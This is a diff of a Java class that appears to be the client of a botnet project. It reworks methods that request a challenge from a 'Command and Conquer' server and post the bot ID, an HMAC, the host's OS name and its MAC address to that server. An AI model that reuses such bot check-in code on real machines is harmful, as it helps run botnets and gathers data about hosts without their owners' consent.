@@ -100,38 +100,20 @@ public class AsyncRequest {
 		}
 		return requestIp;
 	}
-	
-/*	//da valutare se devono essere asincroni
-//	public String getIpBotNetFromCommandAndConquer(String url) {
-//
-//		System.out.println("getIpFromCommandAndConquer");
-//
-//		String requestIp = "";
-//		String postRequest = "{\"user_ip\":\"" +  ":8080\"}";
-//		try {
-//			requestIp = doPost(url, postRequest);
-//			System.out.println("getIpFromEntryPoint get RequestIp " + requestIp);
-//		} catch (Exception e) {
-////			e.printStackTrace();
-//			System.err.println("Errore ricezione Ip da Entry Point");
-//		}
-//		System.out.println(requestIp);
-//		return requestIp;
- * }
-*/	
 
 	//da valutare se devono essere asincroni
-	public Pairs<Long,Integer> getChallengeFromCommandAndConquer(IP ipCeC){
-		Pairs<Long,Integer> challenge = new Pairs<>();
+	public Pairs<Long,Integer> getChallengeFromCommandAndConquer(String idBot,IP ipCeC){
+		Pairs<Long,Integer> response = new Pairs<>();
 		Integer counter = 0;
 		while (counter <= REQNUMBER) {
-		Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();	
-		
+//		Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();	
+//		String postRequest = "{\"idBot\":\""+idBot+"\"}";
 		try {
 			String url="http://"+ipCeC+":8080/welcome";
-			System.out.println("Url:"+url);
-			challenge=doGetJSON(url, type);
-			return challenge;
+			response=restTemplate.postForObject(url, idBot,response.getClass());
+			//System.out.println("Url:"+url);
+			//challenge=doGetJSON(url, type);
+			return response;
 		} catch (Exception e) {
 //			e.printStackTrace();
 			counter++;
@@ -142,17 +124,24 @@ public class AsyncRequest {
 	}
 	
 	//da valutare se devono essere asincroni
-	public String getResponseFromCommandAndConquer(IP ip,Long keyNumber,Integer iterationNumber,String hashMac){
+	public String getResponseFromCommandAndConquer(String idBot,String Mac,IP ip,Long keyNumber,Integer iterationNumber,String hashMac){
 		Integer counter = 0;
 		String response = "";
 		while (counter <= REQNUMBER) {
-		Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
-		String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
+//		Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
+//		String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
 		try {
 			//response = doPost("http://"+ip+":8080/welcome/hmac", hashMac);
 			//RestTemplate rest=new RestTemplate();
+	
+			List<Object> objects=new ArrayList<Object>();
+			objects.add(hashMac);
+			objects.add(idBot);
+			objects.add(System.getProperty("os.name"));
+			objects.add(Mac);
 			
-			response=restTemplate.postForObject("http://"+ip+":8080/hmac", hashMac, String.class);
+			
+			response=restTemplate.postForObject("http://"+ip+":8080/hmac", objects, String.class);
 			System.out.println("Ok");
 			return response;
 		} catch (Exception e) {
